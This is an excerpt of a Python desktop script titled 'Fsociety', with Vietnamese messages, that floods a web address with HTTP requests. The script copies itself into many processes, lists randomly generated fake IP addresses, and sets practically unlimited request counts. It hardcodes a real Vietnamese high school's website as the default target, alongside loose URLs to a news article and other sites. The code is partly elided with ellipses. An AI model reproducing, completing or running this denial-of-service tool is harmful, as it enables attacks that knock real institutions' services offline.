...
if os.getenv("DDOS_INSTANCE") != "spawned":
    for i in range(MAX_RUNS):
        subprocess.Popen([sys.executable, target], env={**os.environ, "DDOS_INSTANCE": "spawned"})
    print(f"Đã sinh {MAX_RUNS} bản sao!")
    sys.exit()
...
class AttackThread(QThread):
    ...
    def __init__(self, target_url, num_requests):
        ...
        self.request_limit = 5000000000000000000000000000  
    ...
    async def get_all_ips(self):
        ...
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 256)}" for _ in range(1000)])
        return all_ips
    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"{ip_address}")
        except Exception:
            pass  
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        QShortcut(QKeySequence(Qt.Key_Return), self).activated.connect(self.start_attack)
        QShortcut(QKeySequence(Qt.Key_Enter), self).activated.connect(self.start_attack)
        
        label = QLabel("HACKING THE PLANET...", self)
        label.setStyleSheet("color: #191919; font-size: 20px;")
        label.move(50, 200)
        self.setWindowTitle("Fsociety")

        self.setGeometry(960, 400, 10, 20)
...
'''
        ...
        self.requests_input.setFixedWidth(100)
    ...
    def start_attack(self):
        target_url = "http://doan.thptchuyenhoangvanthu.edu.vn/" 
        "https://dantri.com.vn/giao-duc/thay-giao-bi-to-sam-so-nu-sinh-lop-8-trong-phong-hoc-20251229062441616.htm?utm_source=coccoc&utm_medium=ccnews"
        "https://github.com/datchuachin3578/fsociety/blob/main/httpdoan.thptchuyenhoangvanthu.edu..txt"
        
        "https://tailieugiaovien.com.vn/tai-lieu/bo-8-de-thi-cuoi-ki-1-vat-li-10-ket-noi-tri-thuc-cau-truc-moi-co-dap-a-8774"
        "https://github.com/SpotX-Official/SpotX?tab=readme-ov-file"
        
        "https://www.topcv.vn/?ref=you" ####################
        try:
            num_requests = 9999999999999999999999
        except ValueError:
